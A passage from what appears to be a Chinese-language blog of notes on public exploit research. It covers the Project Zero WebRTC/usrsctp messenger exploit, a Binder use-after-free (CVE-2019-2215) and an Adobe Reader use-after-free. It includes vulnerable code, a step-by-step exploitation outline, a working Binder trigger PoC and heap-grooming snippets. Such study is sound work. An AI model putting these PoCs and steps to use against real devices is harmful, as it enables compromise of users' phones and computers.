<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (asoc-&gt;str_reset_seq_in == seq) &#123;</span><br><span class="line"> len = ntohs(req-&gt;ph.param_length);</span><br><span class="line"> number_entries = ((len - <span class="keyword">sizeof</span>(struct</span><br><span class="line">  sctp_stream_reset_out_request)) / <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</span><br><span class="line"> tsn = ntohl(req-&gt;send_reset_at_tsn);</span><br><span class="line"> asoc-&gt;last_reset_action[<span class="number">1</span>] = asoc-&gt;last_reset_action[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (...) &#123;</span><br><span class="line">   ...</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (SCTP_TSN_GE(asoc-&gt;cumulative_tsn, tsn)) &#123;</span><br><span class="line">   <span class="comment">/* we can do it now */</span></span><br><span class="line">   ...</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * we must queue it up and thus wait for the TSN's</span></span><br><span class="line"><span class="comment">    * to arrive that are at or before tsn</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   struct sctp_stream_reset_list *liste;</span><br><span class="line">   <span class="keyword">int</span> siz;</span><br><span class="line">   siz = <span class="keyword">sizeof</span>(struct sctp_stream_reset_list) +</span><br><span class="line">    (number_entries * <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</span><br><span class="line">   SCTP_MALLOC(liste, struct sctp_stream_reset_list *,     siz, SCTP_M_STRESET);</span><br><span class="line">   <span class="keyword">if</span> (liste == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* gak out of memory */</span></span><br><span class="line">    asoc-&gt;last_reset_action[<span class="number">0</span>] =</span><br><span class="line">     SCTP_STREAM_RESET_RESULT_DENIED;</span><br><span class="line">    sctp_add_stream_reset_result(chk, seq,</span><br><span class="line">     asoc-&gt;last_reset_action[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   liste-&gt;seq = seq;</span><br><span class="line">   liste-&gt;tsn = tsn;</span><br><span class="line">   liste-&gt;number_entries = number_entries;</span><br><span class="line">   <span class="built_in">memcpy</span>(&amp;liste-&gt;list_of_streams, req-&gt;list_of_streams,</span><br><span class="line">    number_entries * <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</span><br><span class="line">   TAILQ_INSERT_TAIL(&amp;asoc-&gt;resetHead, liste,</span><br><span class="line">    next_resp);</span><br></pre></td></tr></table></figure>
<p>liste这个可以，然后一波操作可以泄露WebRTC，但是仔细一想还是libc好一些。</p>
<h3 id="Moving-the-Instruction-Pointer-Again"><a href="#Moving-the-Instruction-Pointer-Again" class="headerlink" title="Moving the Instruction Pointer (Again)"></a>Moving the Instruction Pointer (Again)</h3><p>密钥是这样计算的：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">srandom(getpid());</span><br></pre></td></tr></table></figure>
<p>所以我们可以通过预测pid，允许攻击设备改善包含任意内容的COOKIE_ECHO块，包括将地址更改为自定义指针。<br>（所以这也是一种劫持指针的方法。）</p>
<h3 id="Putting-it-All-Together"><a href="#Putting-it-All-Together" class="headerlink" title="Putting it All Together"></a>Putting it All Together</h3><p>把我们现有的利用点合到一起，大致方法是fake obj，然后伪造vtable，虚拟调用system。</p>
<p>现在缺少在已知位置填充内存。</p>
<p>注意到<code>SctpTransport</code>类包含一个名为<code>partial_incoming_message_</code>的<code>CopyOnWriteBuffer</code>对象，该对象有时用于存储传入的SCTP数据。SCTP支持数据分段，如果数据包超过一定大小，则usrsctp将不完整的分段数据包传递给WebRTC。这些存储在<code>partial_incoming_message_</code>对象中，直到接收到其余的数据包为止。如果通过SCTP将假对象的数据发送到目标设备，它将最终填充此缓冲区，并且可以读取地址。</p>
<p>在X8分支上崩溃，唯一可控的是X21，X0为vtable，而在libc里，正好：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_nftw（<span class="keyword">char</span> <span class="keyword">const</span> *，<span class="keyword">int</span>（*）…）+ <span class="number">0x138</span></span><br><span class="line"></span><br><span class="line">LDR X0，[X23，＃<span class="number">0x30</span>]</span><br><span class="line">LDR X1，[X23，＃<span class="number">0x70</span>]</span><br><span class="line">BLR X21</span><br></pre></td></tr></table></figure>
<h3 id="漏洞思路"><a href="#漏洞思路" class="headerlink" title="漏洞思路"></a>漏洞思路</h3><ol>
<li>The PID is determined based on the key in the INIT chunk, and then the secret key is determined.</li>
<li>The vtable is read from the SctpTransport object.</li>
<li>The location of malloc is read from the global offset table.</li>
<li>The partial_incoming_message_ buffer is populated with data of the needed size.</li>
<li>The partial_incoming_message_ buffer is cleared, so a new buffer is allocated.</li>
<li>The address of the partial_incoming_message_ buffer is read from the SctpTransport object.</li>
<li>The address of the partial_incoming_message_ backing buffer is read from the buffer structure.</li>
<li>The partial_incoming_message_ buffer is populated with exploit data, based on the location of of malloc.</li>
<li>The bug is triggered, making a virtual call to a gadget and then system.</li>
</ol>
<h3 id="蹲Part3"><a href="#蹲Part3" class="headerlink" title="蹲Part3"></a>蹲Part3</h3><p>Now I had an exploit that worked in … the WebRTC sample Android application. Stay tuned for Part 3, where I explore what real Android applications the exploit works on.</p>
<h2 id="Exploiting-Android-Messengers-with-WebRTC-Part-3"><a href="#Exploiting-Android-Messengers-with-WebRTC-Part-3" class="headerlink" title="Exploiting Android Messengers with WebRTC: Part 3"></a>Exploiting Android Messengers with WebRTC: Part 3</h2><p><a href="https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-3.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-3.html</a></p>
<p>前两Part已经有了在WebRTC上的exp，现在移到App上。</p>
<p>需要hook以下几个函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">usrsctp_conninput <span class="comment">// receives incoming SCTP</span></span><br><span class="line">DtlsTransport::SendPacket <span class="comment">// sends outgoing SCTP</span></span><br><span class="line">cricket::SctpTransport::SctpTransport <span class="comment">// detects when SCTP transport is ready</span></span><br><span class="line">calculate_crc32c <span class="comment">// calculates checksum for SCTP packets</span></span><br><span class="line">sctp_hmac <span class="comment">// performs HMAC to guess secret key</span></span><br><span class="line">sctp_hmac_m <span class="comment">// signs SCTP packet</span></span><br><span class="line">SrtpTransport::ProtectRtp <span class="comment">// suppresses RTP to reduce heap noise</span></span><br></pre></td></tr></table></figure>
<p>然后需要搜一下哪些应用用了WebRTC，可以搜到有很多，然后Facebook Messenger is another interesting target. It has a large number of users, and according to its documentation, any user can call any other user based on their mobile number. Facebook Messenger integrates WebRTC into a library called librtcR11.so, which dynamically links to usrsctp from another library, libxplat_third-party_usrsctp_usrsctpAndroid.so. Facebook Messenger downloads these libraries dynamically as opposed to including them in the APK, so it is difficult to identify the version I examined, but it was downloaded on June 22, 2020.</p>
<p>还有一些其它的，我没听说过，不管了。</p>
<h3 id="Discussion"><a href="#Discussion" class="headerlink" title="Discussion"></a>Discussion</h3><p>讨论了一个WebRTC性能和安全性的问题。</p>
<h2 id="CVE-2020–9854-“Unauthd”"><a href="#CVE-2020–9854-“Unauthd”" class="headerlink" title="CVE-2020–9854: “Unauthd”"></a>CVE-2020–9854: “Unauthd”</h2><p><a href="https://objective-see.com/blog/blog_0x4D.html" target="_blank" rel="noopener">https://objective-see.com/blog/blog_0x4D.html</a></p>
<p>MacOS权限提升的漏洞利用链。</p>
<p>挺有意思一MacOS逻辑漏洞。</p>
<h2 id="Fuzzing-software-advanced-tricks-Part-2"><a href="#Fuzzing-software-advanced-tricks-Part-2" class="headerlink" title="Fuzzing software: advanced tricks (Part 2)"></a>Fuzzing software: advanced tricks (Part 2)</h2><p><a href="https://securitylab.github.com/research/fuzzing-software-2" target="_blank" rel="noopener">https://securitylab.github.com/research/fuzzing-software-2</a></p>
<p>虽然离Part 1有点过于远了。</p>
<ul>
<li>More than ASAN</li>
<li>More than coverage</li>
<li>Custom mutators</li>
<li>More than just crashes</li>
</ul>
<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>So far, we have looked at a variety of techniques that will allow us to improve our fuzzing workflow and find more vulnerabilities in real world software. We introduced the concept of fuzzing for logic vulnerabilities and in the coming years we can expect to see many similar advances and out-of-the-box applications of fuzzing methodologies and technology.</p>
<p>Right now, fuzzing is still in its infancy, and in the coming years we will see a lot of progress in this field. But however much fuzzing technology advances, it will always require a spark of human creativity and out of the box thinking to find real-world vulnerabilities.</p>
<h2 id="Writing-an-iOS-Kernel-Exploit-from-Scratch"><a href="#Writing-an-iOS-Kernel-Exploit-from-Scratch" class="headerlink" title="Writing an iOS Kernel Exploit from Scratch"></a>Writing an iOS Kernel Exploit from Scratch</h2><p><a href="https://secfault-security.com/blog/chain3.html" target="_blank" rel="noopener">https://secfault-security.com/blog/chain3.html</a></p>
<h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* AppleVXD393UserClient::AllocateMemory(_AppleVXD393AllocateMemoryInStruct*,</span></span><br><span class="line"><span class="comment">   _AppleVXD393AllocateMemoryOutStruct*) */</span></span><br><span class="line"></span><br><span class="line"> <span class="number">1</span> undefined8 __thiscall</span><br><span class="line"> <span class="number">2</span> AllocateMemory(AppleVXD393UserClient *<span class="keyword">this</span>,_AppleVXD393AllocateMemoryInStruct *alloc_instruct,</span><br><span class="line"> <span class="number">3</span>               _AppleVXD393AllocateMemoryOutStruct *alloc_outstruct)</span><br><span class="line"> <span class="number">4</span></span><br><span class="line"> <span class="number">5</span> &#123;</span><br><span class="line"> <span class="number">6</span>   <span class="keyword">kern_return_t</span> ret;</span><br><span class="line"> <span class="number">7</span>   _kern_mem_info *tmp_mem;</span><br><span class="line"> <span class="number">8</span>   _kern_mem_info *addr_of_old_0x38_byte_struct;</span><br><span class="line"> <span class="number">9</span></span><br><span class="line"><span class="number">10</span>   <span class="keyword">if</span> ((alloc_instruct-&gt;hardcoded_1 == <span class="number">0</span>) &amp;&amp;</span><br><span class="line"><span class="number">11</span>      (_SMDLog(<span class="string">" %s %d assert broken \n"</span>), alloc_instruct-&gt;hardcoded_1 == <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="number">12</span>     <span class="keyword">return</span> <span class="number">0xe00002c2</span>;</span><br><span class="line"><span class="number">13</span>   &#125;</span><br><span class="line"><span class="number">14</span>   ___bzero(alloc_outstruct,<span class="number">0x68</span>);</span><br><span class="line"><span class="number">15</span>   tmp_mem = (_kern_mem_info *)_IOMalloc(<span class="number">0x38</span>);</span><br><span class="line"><span class="number">16</span>   ___bzero(tmp_mem,<span class="number">0x38</span>);</span><br><span class="line"><span class="number">17</span>   alloc_outstruct-&gt;addr_of_0x38_byte_struct = tmp_mem;</span><br><span class="line"><span class="number">18</span>   _ret = allocateKernelMemory</span><br><span class="line"><span class="number">19</span>                    (<span class="keyword">this</span>-&gt;apple_vxd393,alloc_instruct-&gt;surface_id,(ulong)alloc_instruct-&gt;hardcoded_1</span><br><span class="line"><span class="number">20</span>                     ,alloc_instruct-&gt;hardcoded_memtype_3,alloc_instruct-&gt;hardcoded_maptype_3,</span><br><span class="line"><span class="number">21</span>                     (task *)<span class="keyword">this</span>-&gt;field_0xe0,(_msvdx_client_mem_info *)alloc_outstruct);</span><br><span class="line"><span class="number">22</span>   addr_of_old_0x38_byte_struct = <span class="keyword">this</span>-&gt;addr_of_0x38_byte_struct;</span><br><span class="line"><span class="number">23</span>   tmp_mem-&gt;prev = addr_of_old_0x38_byte_struct;</span><br><span class="line"><span class="number">24</span>   <span class="keyword">if</span> (addr_of_old_0x38_byte_struct != (_kern_mem_info *)<span class="number">0x0</span>) &#123;</span><br><span class="line"><span class="number">25</span>     addr_of_old_0x38_byte_struct-&gt;next = tmp_mem;</span><br><span class="line"><span class="number">26</span>   &#125;</span><br><span class="line"><span class="number">27</span>   <span class="keyword">this</span>-&gt;addr_of_0x38_byte_struct = tmp_mem;</span><br><span class="line"><span class="number">28</span>   <span class="keyword">return</span> _ret;</span><br><span class="line"><span class="number">29</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* AppleVXD393UserClient::DeallocateMemory(_AppleVXD393DeallocateMemoryInStruct*,</span></span><br><span class="line"><span class="comment">   _AppleVXD393DeallocateMemoryOutStruct*) */</span></span><br><span class="line"> <span class="number">1</span> <span class="function">longlong <span class="title">DeallocateMemory</span><span class="params">(AppleVXD393UserClient *<span class="keyword">this</span>,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">2</span>                          <span class="keyword">uint8_t</span> *tmp_buf)</span></span></span><br><span class="line"><span class="function"> 3 </span>&#123;</span><br><span class="line"> <span class="number">4</span>   longlong ret_value;</span><br><span class="line"> <span class="number">5</span>   _kern_mem_info *prev;</span><br><span class="line"> <span class="number">6</span>   _kern_mem_info *tmp_buf_+_0x20;</span><br><span class="line"> <span class="number">7</span>   _kern_mem_info **nexts_prev;</span><br><span class="line"> <span class="number">8</span></span><br><span class="line"> <span class="number">9</span>   tmp_buf_+_0x20 = *(_kern_mem_info **)(tmp_buf + <span class="number">0x20</span>);</span><br><span class="line"><span class="number">10</span>   <span class="keyword">if</span> (tmp_buf_+_0x20 == (_kern_mem_info *)<span class="number">0x0</span>) &#123;</span><br><span class="line"><span class="number">11</span>     ret_value = <span class="number">0</span>;</span><br><span class="line"><span class="number">12</span>   &#125;</span><br><span class="line"><span class="number">13</span>   <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">14</span>     ret_value = deallocateKernelMemory(<span class="keyword">this</span>-&gt;apple_vxd393,tmp_buf_+_0x20);</span><br><span class="line"><span class="number">15</span>     prev = tmp_buf_+_0x20-&gt;prev;</span><br><span class="line"><span class="number">16</span>     <span class="keyword">if</span> (prev != (_kern_mem_info *)<span class="number">0x0</span>) &#123;</span><br><span class="line"><span class="number">17</span>       prev-&gt;next = tmp_buf_+_0x20-&gt;next;</span><br><span class="line"><span class="number">18</span>     &#125;</span><br><span class="line"><span class="number">19</span>                     <span class="comment">/* head-&gt;last OR</span></span><br><span class="line"><span class="comment">20                        &amp;next-&gt;prev IF next != NULL */</span></span><br><span class="line"><span class="number">21</span>     nexts_prev = &amp;<span class="keyword">this</span>-&gt;list_head_prev;</span><br><span class="line"><span class="number">22</span>     <span class="keyword">if</span> (tmp_buf_+_0x20-&gt;next != (_kern_mem_info *)<span class="number">0x0</span>) &#123;</span><br><span class="line"><span class="number">23</span>       nexts_prev = &amp;tmp_buf_+_0x20-&gt;next-&gt;prev;</span><br><span class="line"><span class="number">24</span>     &#125;</span><br><span class="line"><span class="number">25</span>     *nexts_prev = prev;</span><br><span class="line"><span class="number">26</span>     _IOFree(tmp_buf_+_0x20,<span class="number">0x38</span>);</span><br><span class="line"><span class="number">27</span>   &#125;</span><br><span class="line"><span class="number">28</span>   <span class="keyword">return</span> ret_value;</span><br><span class="line"><span class="number">29</span> &#125;</span><br></pre></td></tr></table></figure>
<p>dbf，TODO爷不看了。</p>
<h2 id="VirtualBox漏洞挖掘"><a href="#VirtualBox漏洞挖掘" class="headerlink" title="VirtualBox漏洞挖掘"></a>VirtualBox漏洞挖掘</h2><p>// TODO</p>
<p>先看一波这个：</p>
<p><a href="https://www.voidsecurity.in/?m=1" target="_blank" rel="noopener">https://www.voidsecurity.in/?m=1</a></p>
<h3 id="如何挖洞"><a href="#如何挖洞" class="headerlink" title="如何挖洞"></a>如何挖洞</h3><p><a href="https://www.anquanke.com/post/id/212096" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212096</a></p>
<p><a href="https://www.anquanke.com/post/id/211930" target="_blank" rel="noopener">https://www.anquanke.com/post/id/211930</a>（很多paper）</p>
<h2 id="CVE-2019-2215-Android-Use-after-Free-in-Binder"><a href="#CVE-2019-2215-Android-Use-after-Free-in-Binder" class="headerlink" title="CVE-2019-2215: Android Use-after-Free in Binder"></a>CVE-2019-2215: Android Use-after-Free in Binder</h2><p><a href="https://googleprojectzero.blogspot.com/p/rca-cve-2019-2215.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/p/rca-cve-2019-2215.html</a></p>
<p><a href="https://xz.aliyun.com/t/6853" target="_blank" rel="noopener">https://xz.aliyun.com/t/6853</a></p>
<p>是一个UaF：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">binder_thread</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_proc</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb_node</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">waiting_thread_node</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="keyword">int</span> looper;              <span class="comment">/* only modified by this thread */</span></span><br><span class="line">    <span class="keyword">bool</span> looper_need_return; <span class="comment">/* can be written by other thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_transaction</span> *<span class="title">transaction_stack</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">todo</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> process_todo;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_error</span> <span class="title">return_error</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_error</span> <span class="title">reply_error</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_stats</span> <span class="title">stats</span>;</span></span><br><span class="line">    <span class="keyword">atomic_t</span> tmp_ref;</span><br><span class="line">    <span class="keyword">bool</span> is_dead;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue_head</span> &#123;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>              lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>        <span class="title">task_list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue_head</span> <span class="title">wait_queue_head_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_wait_queue</span><span class="params">(<span class="keyword">wait_queue_head_t</span> *q, <span class="keyword">wait_queue_t</span> *wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    spin_lock_irqsave(&amp;q-&gt;lock, flags);</span><br><span class="line">    __remove_wait_queue(q, wait);</span><br><span class="line">    spin_unlock_irqrestore(&amp;q-&gt;lock, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__remove_wait_queue(<span class="keyword">wait_queue_head_t</span> *head, <span class="keyword">wait_queue_t</span> *old)</span><br><span class="line">&#123;</span><br><span class="line">    list_del(&amp;old-&gt;task_list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>__remove_wait_queue</code>的时候，会使用<code>binder_thread</code>里的<code>wait</code>，然而<code>binder_thread</code>可能已经被释放，造成UaF。</p>
<p>POC是这个：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd, epfd;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> = &#123;</span> .events = EPOLLIN &#125;;</span><br><span class="line"></span><br><span class="line">        fd = open(<span class="string">"/dev/binder"</span>, O_RDONLY);</span><br><span class="line">        epfd = epoll_create(<span class="number">1000</span>);</span><br><span class="line">        epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event);</span><br><span class="line">        ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942#c7" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1942#c7</a></p>
<p>利用思路，用iovec造成堆块重叠，然后unlink，触发泄露，拿到任意地址读写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> &#123;</span>      <span class="comment">// Size: 0x10</span></span><br><span class="line">    <span class="keyword">void</span> *iov_base; <span class="comment">// 0x00</span></span><br><span class="line">    <span class="keyword">size_t</span> iov_len; <span class="comment">// 0x08</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; <span class="comment">// mutex</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">1</span>; <span class="comment">// linked list next</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="keyword">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">// linked list prev</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>; <span class="comment">// iov_len of previous, then this element and next element</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_base = (<span class="keyword">void</span> *)<span class="number">0xBEEFDEAD</span>;</span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_len = <span class="number">8</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Vulnerability-Discovery-in-Open-Source-Libraries-Analyzing-CVE-2020-11863"><a href="#Vulnerability-Discovery-in-Open-Source-Libraries-Analyzing-CVE-2020-11863" class="headerlink" title="Vulnerability Discovery in Open Source Libraries: Analyzing CVE-2020-11863"></a>Vulnerability Discovery in Open Source Libraries: Analyzing CVE-2020-11863</h2><p><a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/vulnerability-discovery-in-open-source-libraries-analyzing-cve-2020-11863/" target="_blank" rel="noopener">https://www.mcafee.com/blogs/other-blogs/mcafee-labs/vulnerability-discovery-in-open-source-libraries-analyzing-cve-2020-11863/</a></p>
<p>libEMF这个linux上的库，use uninitialized memory。看完上半部分我的想法就是，为什么index会大于vector.length()，结果告诉我在<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11865" target="_blank" rel="noopener">CVE-2020-11865</a>；所以最终这个洞就是dereference了ASAN的0xbebebebebebebebe。</p>
<h2 id="CVE-2020-9715-EXPLOITING-A-USE-AFTER-FREE-IN-ADOBE-READER"><a href="#CVE-2020-9715-EXPLOITING-A-USE-AFTER-FREE-IN-ADOBE-READER" class="headerlink" title="CVE-2020-9715: EXPLOITING A USE-AFTER-FREE IN ADOBE READER"></a>CVE-2020-9715: EXPLOITING A USE-AFTER-FREE IN ADOBE READER</h2><p><a href="https://www.thezdi.com/blog/2020/9/2/cve-2020-9715-exploiting-a-use-after-free-in-adobe-reader" target="_blank" rel="noopener">https://www.thezdi.com/blog/2020/9/2/cve-2020-9715-exploiting-a-use-after-free-in-adobe-reader</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">triggerUAF</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// This will cause an access to the freed Data ESObject object in the object cache</span></span><br><span class="line">    <span class="keyword">this</span>.dataObjects[<span class="number">0</span>].toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Trigger the creation of a Data ESObject which will be stored in the object cache</span></span><br><span class="line">    <span class="keyword">this</span>.dataObjects[<span class="number">0</span>].toString();  </span><br><span class="line"></span><br><span class="line">    <span 